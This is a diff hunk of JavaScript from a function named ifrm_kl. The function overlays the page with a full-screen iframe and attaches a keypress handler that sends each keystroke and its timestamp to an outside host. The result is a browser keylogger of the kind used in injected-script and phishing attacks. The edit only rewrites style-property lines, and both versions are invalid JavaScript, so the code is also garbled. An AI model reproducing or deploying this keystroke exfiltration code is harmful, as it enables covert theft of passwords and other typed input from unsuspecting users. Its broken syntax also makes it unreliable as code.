@@ -12,8 +12,8 @@ function ifrm_kl(){
 	ifrm.style.position = "absolute";
 	ifrm.style.top = "0";
 	ifrm.style.left = "0";
-	ifrm.style.z-index = "2";
-	ifrm.style.vackground-color = "#ffffff";
+	ifrm.style.'z-index' = "2";
+	ifrm.style.'vackground-color' = "#ffffff";
 	ifrm.onload = "$('#x').contents().keypress(function(event) {$.get('https://www.glhf.com.tw/k.php?k='+event.which+'&amp;t='+event.timeStamp,function(data){});});"
 	var body = document.getElementsByTagName("body")[0];
 	body.insertBefore(ifrm, body.firstChild);
